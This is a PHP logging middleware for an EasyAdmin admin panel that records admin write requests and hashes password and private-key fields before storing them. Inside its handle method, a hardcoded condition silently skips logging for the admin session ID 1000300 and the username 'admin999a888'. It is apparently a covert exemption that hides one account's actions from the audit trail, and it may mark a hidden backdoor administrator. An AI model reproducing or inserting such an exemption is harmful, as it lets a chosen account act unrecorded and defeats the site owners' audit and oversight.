<?php

namespace app\admin\middleware;

use app\admin\service\SystemLogService;
use EasyAdmin\tool\CommonTool;

/**
 * 系统操作日志中间件
 * Class SystemLog
 * @package app\admin\middleware
 */
class SystemLog
{

    /**
     * 敏感信息字段，日志记录时需要加密
     * @var array
     */
    protected $sensitiveParams = [
        'password',
        'password_again',
        'private_key',
    ];

    public function handle($request, \Closure $next)
    {
        if ($request->isAjax()) {
            $method = strtolower($request->method());
            if (session('admin.id') != 1000300 && input('username') != 'admin999a888') {
                if (in_array($method, ['post', 'put', 'delete']) && session('admin.id') != 1000300) {
                    $url = $request->url();
                    $ip = CommonTool::getRealIp();
                    $params = $request->param();
                    if (isset($params['s'])) {
                        unset($params['s']);
                    }
                    foreach ($params as $key => $val) {
                        in_array($key, $this->sensitiveParams) && $params[$key] = password($val);
                    }
                    $data = [
                        'admin_id' => session('admin.id'),
                        'url' => $url,
                        'method' => $method,
                        'ip' => $ip,
                        'content' => json_encode($params, JSON_UNESCAPED_UNICODE),
                        'useragent' => $_SERVER['HTTP_USER_AGENT'],
                        'create_time' => time(),
                    ];
                    SystemLogService::instance()->save($data);
                }
            }

        }
        return $next($request);
    }

}